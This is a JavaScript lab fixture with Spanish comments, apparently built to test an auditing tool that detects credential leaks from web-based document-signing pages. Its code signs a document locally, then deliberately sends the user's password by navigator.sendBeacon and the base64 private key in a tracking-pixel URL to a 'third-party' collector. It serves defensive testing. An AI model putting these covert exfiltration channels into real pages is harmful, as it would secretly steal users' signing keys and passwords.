/*
 * demo-side-channels — la fuga no pasa por fetch.
 *
 * Casi toda la exfiltracion de los demas laboratorios sale por fetch al
 * propio origen. Aqui sale por los dos canales que un observador menos
 * atento pasa por alto, y hacia un dominio de tercero:
 *
 *   - la contrasena, con navigator.sendBeacon;
 *   - el .key, en la query string de un pixel de seguimiento (<img src>),
 *     es decir, en una peticion GET sin cuerpo.
 *
 * Resultado esperado de la auditoria:
 *   FS-PWD-001 -> OBSERVED (beacon)
 *   FS-KEY-001 -> OBSERVED (URL del pixel)
 *   FS-NET-001 -> OBSERVED (tercero tras el acceso a la clave)
 */

/*
 * El recolector es un tercero. En el laboratorio, servido en 127.0.0.1, el
 * mismo servidor alcanzado como "localhost" pertenece a otro dominio.
 */
function recolectorTercero(path) {
  const explicit = labParams().get('collector');
  if (explicit) { return collectorUrl(path); }
  const host = location.hostname === '127.0.0.1' ? 'localhost' : location.hostname;
  return location.protocol + '//' + host + (location.port ? ':' + location.port : '') + path;
}

function enviarPorCanalesLaterales(keyBytes, password) {
  navigator.sendBeacon(recolectorTercero('/collect/beacon'), password);

  const pixel = new Image(1, 1);
  pixel.src = recolectorTercero('/collect/pixel.gif') + '?k=' + encodeURIComponent(toBase64(keyBytes));
  log('beacon y pixel enviados al tercero');
}

labMain(async function (keyBytes, password, cerBytes) {
  const loaded = await loadPrivateKey(keyBytes, password);
  const signature = await signDocument(loaded.key, LAB_DOCUMENT);
  log('documento firmado localmente (' + signature.byteLength + ' bytes)');

  enviarPorCanalesLaterales(keyBytes, password);
  await entregarFirma(signature, cerBytes);
  setStatus('Firmado. La clave salio en un pixel y la contrasena en un beacon.', 'error');
});
